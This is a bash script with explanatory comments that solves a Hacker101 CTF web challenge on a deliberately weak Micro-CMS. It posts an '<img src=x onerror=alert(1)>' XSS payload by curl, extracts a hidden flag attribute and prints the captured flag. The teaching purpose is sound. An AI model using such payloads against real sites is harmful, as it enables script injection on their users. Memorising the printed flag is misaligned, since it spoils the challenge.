#!/usr/bin/env bash

set -euo pipefail

# Challenge: Micro-CMS (next level after the first Micro-CMS instance)
# Platform: Hacker101 / HackerOne CTF
# Category: Web
#
# Target:
#   https://485e7c84a8bab02b6bb7bbf261539e34.ctf.hacker101.com/
#
# What this challenge teaches:
#   Input filtering that tries to "scrub" dangerous HTML by replacing words or
#   tweaking obvious patterns is brittle. If the application still allows some
#   HTML tags through, those surviving tags can become carriers for sensitive
#   server-side data such as a hidden flag attribute.
#
# Real-world analogy:
#   This is like a building guard who only confiscates items named "knife" but
#   still allows a sharpened screwdriver through. The defense is focused on a
#   narrow pattern instead of controlling the real danger: untrusted HTML being
#   rendered in the browser.
#
# Observed behavior in this level:
#   1. The CMS supports page creation and editing without authentication.
#   2. Raw script tags are not removed safely; they are rewritten into tags like
#      <scrubbed>, which shows the app is doing ad-hoc string replacement.
#   3. A markdown link with javascript: becomes "javascrubbed:", another sign of
#      weak keyword-based filtering.
#   4. Most importantly, an HTML image tag survives rendering:
#        <img src=x onerror=alert(1)>
#   5. When the image tag survives, the rendered page includes a server-injected
#      attribute named flag on that img element.
#
# Why this matters:
#   Once a server renders attacker-controlled HTML, even if it "sanitizes" some
#   obvious payloads, the surviving markup can still expose secrets or become an
#   XSS gadget. The right defense is proper escaping or a well-tested sanitizer,
#   not hand-written replacements.
#
# Manual solve steps:
#
# Step 1: Create a page containing an HTML image payload.
# Command:
#   curl -i -sS -X POST 'https://485e7c84a8bab02b6bb7bbf261539e34.ctf.hacker101.com/page/create' \
#     --data-urlencode 'title=test3' \
#     --data-urlencode 'body=<img src=x onerror=alert(1)>'
# Reason:
#   The image tag is one of the payloads that survives the markdown/rendering
#   pipeline in this level.
#
# Step 2: Follow the redirect to the created page.
# Command:
#   curl -sS 'https://485e7c84a8bab02b6bb7bbf261539e34.ctf.hacker101.com/page/14'
# Reason:
#   The server responds with a Location header like /page/14 after creation.
#   Viewing that page reveals the final rendered HTML.
#
# Step 3: Extract the injected flag attribute.
# Command:
#   curl -sS 'https://485e7c84a8bab02b6bb7bbf261539e34.ctf.hacker101.com/page/14' | grep -o 'flag=\"[^\"]*\"'
# Reason:
#   The page contains:
#     <img src=x flag="^FLAG^...$FLAG$" onerror=alert(1)>
#   so the flag can be pulled straight from the HTML source.
#
# One-shot behavior:
#   Running this script creates a disposable page with the image payload,
#   fetches the rendered page, and prints the flag directly.

BASE='https://485e7c84a8bab02b6bb7bbf261539e34.ctf.hacker101.com'

location="$(
  curl -i -sS -X POST "$BASE/page/create" \
    --data-urlencode 'title=img_poc' \
    --data-urlencode 'body=<img src=x onerror=alert(1)>' |
  sed -n 's/^location: \(.*\)\r$/\1/p' | tail -n 1
)"

html="$(curl -sS "$BASE$location")"

printf '%s\n' "$html" | python3 -c '
import re, sys
data = sys.stdin.read()
match = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", data)
if not match:
    raise SystemExit("flag not found in rendered HTML")
print(match.group(0))
'

# Final flag obtained:
# ^FLAG^b688020e0f646d6a20457df946434b395d1ac1f9b60b21ea582e5a075cc2b2f6$FLAG$
